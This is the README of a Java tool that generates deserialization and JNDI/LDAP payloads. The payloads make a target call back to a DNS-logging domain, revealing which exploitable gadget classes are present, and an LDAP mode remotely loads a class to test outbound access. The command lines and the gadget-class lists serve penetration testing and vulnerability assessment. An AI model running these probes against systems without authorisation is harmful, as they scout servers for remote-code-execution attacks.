# Urldns
此工具仅能dnslog漏洞测试，不可用于非法用途，有问题请联系sonomon@126.com  

有三种模式，base64，file，ldap，file默认当前目录生成文件1.ser，ldap默认端口1389  
请输入: java -jar Urldns.jar base64 all dnslog.com  
或者   : java -jar Urldns.jar file all dnslog.com  
或者   : java -jar Urldns.jar ldap all dnslog.com  

目前支持的内置探测类如下，使用all将全部探测，可以将all替换为如下简写进行单独探测，也可以填写自定义的类进行探测。如果想同时探测多个类，用|分割。
`
CommonsCollections13567  
CommonsCollections24  
CommonsBeanutils2  
C3P0  
AspectJWeaver  
bsh  
Groovy  
Becl  
Jdk7u21  
winlinux  
`

使用ldap模式的all将额外探测如下  
`
javax.el.ELProcessor  
org.apache.naming.factory.BeanFactory  
groovy.lang.GroovyShell  
groovy.lang.GroovyClassLoader  
org.yaml.snakeyaml.Yaml  
com.thoughtworks.xstream.XStream  
org.mvel2.sh.ShellSession  
org.apache.catalina.UserDatabase  
org.apache.catalina.users.MemoryUserDatabaseFactory  
org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory  
org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory  
org.apache.commons.dbcp2.BasicDataSourceFactory  
org.apache.commons.dbcp.BasicDataSourceFactory  
org.apache.tomcat.jdbc.pool.DataSourceFactory  
com.alibaba.druid.pool.DruidDataSourceFactory  
`

示例: java -jar Urldns.jar base64 "CommonsBeanutils2|C3P0|ognl.OgnlContext" dnslog.com

ldap模式支持ldap://2.2.2.2:1389/jndi，将不再反序列化而是远程加载class，以探测是否出网
